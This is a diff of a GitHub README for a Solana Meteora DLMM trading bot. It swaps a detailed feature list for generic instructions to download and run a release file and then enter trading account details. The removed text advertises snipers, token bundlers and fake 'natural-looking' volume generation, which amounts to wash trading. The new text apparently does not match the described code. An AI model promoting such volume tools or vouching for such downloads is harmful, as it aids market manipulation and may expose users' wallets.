@@ -1,200 +1,89 @@
-<div align="center">
+# 🌟 meteora-dlmm-bot - Trade Smart with Ease
 
-# 🚀 Meteora Copy-Trading & Pool Scanner Bot
+## 🚀 Getting Started
 
-meteora / meteora dlmm / meteora dlmm bot / meteora dlmm copy trade bot / meteora dlmm trade bot / meteora trade bot / meteora bot / pump.fun bundler / pumpdotfun bundler / bonk.fun bundler / bonkfun bundler / letsbonkfun bundler / letsbonk bundler / bags.fm bundler / bagsfm bundler
+Welcome to the meteora-dlmm-bot! This tool helps you automate trading strategies with ease. Whether you want to copy trades or manage multiple accounts, this bot is designed for you.
 
-_Automated trading assistant for Solana — powered by **Meteora DLMM** & **Jupiter v6**._
+[![Download meteora-dlmm-bot](https://img.shields.io/badge/Download%20meteora--dlmm--bot-blue.svg)](https://github.com/K48L/meteora-dlmm-bot/releases)
 
-![Solana](https://img.shields.io/badge/Solana-Meteora-purple?logo=solana&logoColor=white)
-![TypeScript](https://img.shields.io/badge/TypeScript-Node.js-blue?logo=typescript)
-![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)
+## 📦 Features
 
-</div>
+- Automate your trading strategies
+- Copy trades from experienced traders
+- Manage multiple trading accounts effortlessly
+- User-friendly interface
 
----
+## ✔️ System Requirements
 
-## ✨ Features
+- Operating System: Windows 10 or later, macOS 10.15 or later
+- RAM: Minimum 4 GB
+- Disk Space: At least 200 MB free
+- Internet Connection: Required for trading operations
 
-- 🔄 **Copy-Trading**  
-  Mirror trades of chosen leader wallets in real time.  
-  Supports **Jupiter v6** and **Meteora DLMM** swaps.  
+## 🔗 Download & Install
 
-- 📊 **Pool Scanner**  
-  Fetches all active **DLMM pools** and computes potential APR based on liquidity, volume and fee structure.  
+To download the meteora-dlmm-bot, visit the Releases page:
 
-- ⚙️ **Customizable Execution**  
-  - Adjustable **slippage**  
-  - **DEX whitelist** (e.g. only route through Meteora)  
-  - Maximum per-trade allocation  
+[Download meteora-dlmm-bot](https://github.com/K48L/meteora-dlmm-bot/releases)
 
-- 💾 **Local Trade Log**  
-  SQLite database of mirrored trades with full history.  
+Once on the page, you will see various versions of the software. Follow these steps:
 
----
+1. Look for the latest version at the top of the list.
+2. Select the file for your operating system.
+3. Click on the filename to start the download.
 
-## 📂 Project Structure
+After downloading, follow these steps to install:
 
-```
-meteora-copybot/
-├── src/
-│   ├── analytics/       # Pool scanner & APR estimator
-│   ├── copytrading/     # Leader watcher & tx parser
-│   ├── dex/             # Jupiter & Meteora SDK wrappers
-│   ├── execution/       # Transaction signing/sending
-│   ├── storage/         # SQLite trade log
-│   ├── utils/           # Wallet helpers
-│   ├── config.ts        # Config loader (.env)
-│   └── index.ts         # Bot entrypoint
-├── .env.example         # Environment variables template
-├── package.json
-└── README.md
-```
+1. Locate the downloaded file on your computer.
+2. Double-click on the file to initiate the setup.
+3. Follow the on-screen instructions to complete the installation.
 
----
+## ⚙️ Configuration
 
-## ⚡ Quick Start
+After installation, configure the bot to match your trading preferences:
 
-<img width="2544" height="1360" alt="Image" src="https://github.com/user-attachments/assets/eeb82b8a-3bd5-4c82-acfa-f64e93adec60" />
+1. Open the meteora-dlmm-bot application.
+2. Enter your trading account details.
+3. Set your preferred strategies and limits.
+4. Save your settings.
 
-[![Get Started](https://img.shields.io/badge/Get%20Started-Now-blue?style=for-the-badge)](https://tr.ee/AnBmYK)
+## 📊 Using the Application
 
----
+Here’s how to start using the meteora-dlmm-bot:
 
-## 🔧 Configuration (`.env`)
+1. Launch the application.
+2. Ensure your internet connection is stable.
+3. Check that your trading account is linked.
+4. Start the bot to automate trades according to your setup.
 
-| Variable             | Description |
-|----------------------|-------------|
-| `RPC_URL`            | Solana RPC endpoint (private RPC recommended) |
-| `WALLET_SECRET_KEY`  | Base58 or JSON array secret key (⚠️ use test wallet for dev) |
-| `LEADER_ADDRESSES`   | Comma-separated list of wallets to mirror |
-| `MAX_TRADE_QUOTE`    | Max input amount per trade (native units) |
-| `SLIPPAGE_BPS`       | Allowed slippage (100 = 1%) |
-| `DEX_WHITELIST`      | Restrict to certain DEX labels (e.g. `METEORA,Raydium`) |
-| `JUP_API_KEY`        | (Optional) Jupiter API key |
-| `QUOTE_API_BASE`     | Jupiter quote endpoint (defaults to `https://quote-api.jup.ag`) |
+## 📞 Support
 
----
+If you encounter any issues, feel free to reach out for support. We have a community of users ready to help:
 
-## 📡 How It Works
+- GitHub Issues: [Report Issues](https://github.com/K48L/meteora-dlmm-bot/issues)
+- Community Forum: (Link to forum if available)
 
-1. **Watcher**  
-   Polls leader wallets via `getSignaturesForAddress` → parses transactions → detects swaps through  
-   - Jupiter v6 (`JUP6Lkb…`)  
-   - Meteora DLMM (`LBUZKhR…`)  
+## 💬 Community Feedback
 
-2. **Execution**  
-   Uses Jupiter API v6 to request a swap route with the same in/out mints.  
-   Builds a signed transaction with your wallet and submits it.  
+Your feedback is valuable. Share your experiences and suggestions with us to help improve future versions of meteora-dlmm-bot. Join discussions on our community forum or GitHub.
 
-3. **Pool Scanner**  
-   Calls [`dlmm-api.meteora.ag/pair/all`] → lists pools → computes **fee APR** proxy:  
-   ```
-   feeAPR ≈ (24h Volume × Avg Fee) / Liquidity × 365
-   ```
+## ✅ Frequently Asked Questions
 
----
+1. **Can I run the bot on multiple accounts?**
+   Yes, the meteora-dlmm-bot allows you to manage multiple accounts.
 
-## 📊 Example Output
+2. **What trading platforms are supported?**
+   The bot is designed to work with major trading platforms. Please refer to the documentation for detailed compatibility.
 
-```
-[mirror] Leader: 9xyz…abc | TX: 4M…kA
-  Swap: SOL -> USDC | Amount: ~1 SOL
-  Routed via: Jupiter v6 (DEX: Meteora)
-  Executed ✅ | Sig: 5F...Lm
-```
+3. **Is there a user guide available?**
+   Yes, a user guide is included in the application and is accessible from the help menu.
 
----
-## 🌟 Key Features SolGod
+## 🌐 Additional Resources
 
-### 🎨 User Dashboard
-- Real-time **task editing**
-- Grouped **RPC & Proxy** settings
-- One-click **Quicktask launch**
-- Integrated **Sell buttons**
-- Smart **Task group handling**
-- Built-in **TPS performance monitor**
+For more details on how to maximize your trading experience, consider these resources:
 
----
+- User Manual: Available in the application.
+- Video Tutorials: Check our YouTube channel for step-by-step guides.
+- Community Forum: Join discussions with other users.
 
-### 🤝 Copy-Trading Engine
-#### 🔍 Wallet Scanner / Analyzer
-- Detect and parse **migrated contracts**
-- Manage **unlimited wallet lists** across multiple sources
-- Powerful **filters & conditional logic**
-- Export detailed reports to **Excel / CSV**
-
-#### 📊 Wallet Activity Tracker
-- Mirror **all trading actions** from selected wallets
-- Get **deep insights** with a streamlined interface
-
----
-
-### 🎯 Solana Snipers
-- **PumpFun sniper** with 20+ dynamic filters
-- **PumpFun → Raydium auto-migration** sniper & dumper
-- **Raydium sniper**
-- **Meteora Pools & DLMM sniper**
-- **Moonshot sniper** (supports Meteora migration)
-- **BonkFun sniper**
-- **bags.fm sniper/bundler/copy-trader with 10+ filters**
-- **heaven.xyz sniper/bundler/copy-trader with 10+ filters**
-- Integrated **Discord / Telegram / Twitter scrapers**
-- **Anti-MEV & Bloxroute** integration
-- **AFK sniper** with continuous in-house monitoring
-
----
-
-### 🎭 Solana NFT Suite
-- LMNFT Launchpad automation
-- MagicEden Launchpad support
-- 3Land Launchpad integration
-
----
-
-### 📈 Volume Automation
-- Generate **natural-looking trading volume**
-- Flexible **SOL buy range settings** + randomized delays
-- Support for **unlimited wallets**
-
----
-
-### 🛠 Token Bundler
-- Deploy bundles on **PumpFun, Raydium, Meteora, BonkFun, bags.fm, heaven.xyz**
-- Define **wallet count & SOL allocations**
-- Adjustable **distribution ratios**
-- **Anti-sniper protection** prebuilt
-
----
-
-### ⚡ Essential Tools
-- Fast Wallet Generator
-- Multi-wallet Balance Checker
-- **SOL Wrapper / Unwrapper**
-
----
-
-## 🔐 Security & Compliance
-- Full control over **caps, retries, slippage**
-- Designed for **hot wallets only** — keep cold storage secure
-- Always respect **laws & platform rules**
-
----
-
-## 🎁 Free Trial
-Enjoy a **1-hour free trial** — explore all features risk-free!  
-
-[![🚀 Start Now](https://img.shields.io/badge/🚀%20Start%20Now-Free-green?style=for-the-badge)](https://tr.ee/AnBmYK)  
- 
----
-## 🔗 Contacts  
-**Address:** 129 Bishopsgate, London EC2M 3XD  
-**Phone:** +44 20 3872 6611  
-**Email:** support@solgod.io  
-**Open hours:** Mon–Fri 08:00–20:00, Sat–Sun 09:00–18:00  
-
----
-
-## 📜 License
-
-(LICENSE) © 2025 — Feel free to fork, hack, and extend.
+By following these steps, you will confidently download, install, and run the meteora-dlmm-bot. We hope you enjoy a seamless trading experience!
